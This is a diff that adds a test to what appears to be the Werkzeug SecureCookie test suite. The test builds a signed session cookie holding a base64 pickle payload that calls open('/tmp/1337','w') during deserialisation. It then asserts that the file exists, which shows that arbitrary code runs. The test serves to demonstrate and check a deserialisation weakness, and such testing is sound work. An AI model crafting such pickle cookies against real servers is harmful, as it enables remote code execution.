@@ -44,3 +44,22 @@ def test_wrapper_support():
     c2 = SecureCookie.load_cookie(req, secret_key='foo')
     assert not c2.new
     assert c2 == c
+
+
+def test_pickle_exploit():
+    """
+    Exploit SecureCookie use of pickle for running arbitrary code.
+
+    The used pickle is:
+    >>> "(S'/tmp/1337'\np1\nS'w'\np2\ni__builtin__\nopen\np3\n(dp4\nb."
+    
+    """
+    import os
+    CRAFTED_COOKIE = "1uy1JJYjjPFcZmyy235olMQoYbU=?foo=KFMnL3RtcC8xMzM3JwpwMQpTJ3cnCnAyCmlfX2J1aWx0aW5fXwpvcGVuCnAzCihkcDQKYi4="
+        
+    req = Request.from_values(headers={
+        'Cookie':  'session="%s"' % CRAFTED_COOKIE
+    })
+    c = SecureCookie.load_cookie(req, secret_key='foo')
+    assert not c.new
+    assert os.path.exists('/tmp/1337')
